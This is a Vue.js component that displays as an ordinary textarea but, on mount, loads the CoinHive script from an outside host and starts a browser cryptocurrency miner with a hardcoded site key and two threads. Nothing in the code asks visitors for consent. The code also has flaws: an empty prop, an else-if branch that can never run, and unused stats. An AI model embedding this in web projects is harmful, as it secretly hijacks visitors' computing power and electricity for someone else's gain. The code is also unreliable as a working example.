<template lang="html">
<textarea class="vue-coin-hive" v-model="editableValue" :maxlength="maxlength"></textarea>
</template>

<script>
  import loadScript from 'load-script'
  export default {
    name: 'vue-coin-hive',
    props: {
      siteKey: {
        type: String,
        default: 'SF4YQtgkNYmwR21W8NzKwixVdHB8wlDf',
        required: false,
      },
      userName: {
        type: String,
        default: null,
        required: false,
      },
      threads: {
        type: Number,
        default: 2,
        required: false,
      },
      throttle: {
      
      }
    },
    mounted () {
      loadScript('https://coin-hive.com/lib/coinhive.min.js', () => {
        if (this.siteKey) {
          this.miner = new CoinHive.Anonymous(this.siteKey)
        } else if (this.siteKey && this.userName) {
          this.miner = new CoinHive.User(this.siteKey, this.userName)
        }
        console.log('checking load script! ', this.miner)
      })
    },
    data () {
      return {
        miner: null,
        editableValue: this.value
      }
    },
  
    watch: {
      miner () {
        if (this.miner) {
          this.miner.start();
          this.miner.on('found', (x ) => {
            console.log('hash founded! ', x)
          })
          this.miner.on('accepted', (x) => {
            console.log('accepted! ', x)
          })

          // Update stats once per second
          setInterval(() => {
            const hashesPerSecond = this.miner.getHashesPerSecond()
            const totalHashes = this.miner.getTotalHashes()
            const acceptedHashes = this.miner.getAcceptedHashes()
            
          }, 1000);
        }
      },
  
      editableValue: {
        immediate: true,
        handler (newValue) {
        }
      }
    },
  
    computed: {
    }
  }
</script>
